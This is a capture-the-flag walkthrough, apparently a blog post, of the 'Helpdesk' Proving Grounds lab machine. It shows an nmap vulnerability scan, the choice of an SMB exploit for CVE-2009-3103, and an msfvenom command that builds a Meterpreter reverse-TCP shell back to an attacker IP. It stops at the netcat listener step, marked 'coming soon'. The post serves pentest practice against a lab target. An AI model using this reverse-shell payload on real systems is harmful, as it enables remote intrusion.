---
title: Helpdesk Walkthrough - Proving Grounds
description: "Walkthrough of the Helpdesk machine from Proving Grounds "
author: Cyber Operator
date: 2024-07-24T14:48:18.308Z
tags:
  - Tags
---
# Helpdesk Exploitation Walkthrough

This machine is under the "Easy" level of Proving Grounds, it is valuable for general pentest practice or for exam preparation (such as OSCP etc).  This walkthrough may be completed under various sessions, you may see the target IP address change.

Step by step:

1. ## Scan with NMAP:

I like to do two nmap scans, one a very simple pass with the standard options.  This is mostly to have something to look at while waiting for the more detailed scan results, which follow this command:

`nmap -sC -sV --script vuln -p- [target IP]`

This will do a version scan, basic vulnerability check and scan all ports.  It takes time, good idea to let it run while we explore based on the simple scan results.

Here are the detailed scan results:

![](/static/img/screenshot-2024-07-24-at-11.26.36 am.png)

![](/static/img/screenshot-2024-07-24-at-11.27.38 am.png)

Right from the results, we see that there is a webserver in port 8080 and that there are some vulnerabilities (maybe user input fields, or a form).  So let's visit the site (IP:port combination) to see what's there:

![](/static/img/screenshot-2024-07-24-at-11.30.46 am.png)

There may be something there, let's see what else we can find first.  We see that this is a Windows Server, 2008 R2, RPC port, Microsoft Terminal service, SMB (an interoperability service) and some magic found in the form of CVE-2009-3103 "execute arbitrary code".  As interesting as the 8080 server is, this one seems like a juicier starting point so let's start there.

## 2. Exploitation

We find an exploit in Exploit DB, including the command to use msfvenom to generate the required shellcode:

![](/static/img/screenshot-2024-07-24-at-11.43.17 am.png)

Specifically, we need to download the exploit code, then replace the shellcode in the download with our own generated shellcode.  We will generate that shellcode using the following command (can be found as a comment on the exploit code)

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker IP] LPORT=[attacker port, such as 443]  EXITFUNC=thread  -f python`

Next, we generate our shellcode for our payload:

![](/static/img/screenshot-2024-07-24-at-11.50.17 am.png)

We now copy our payload into our downloaded exploit code, which we can edit using a text edit tool, here we used nano:

![](/static/img/screenshot-2024-07-24-at-11.55.49 am.png)

We need to start a netcat listener on the attack machine so that the target can communicate with our attack machine:



\-- COMING SOON ---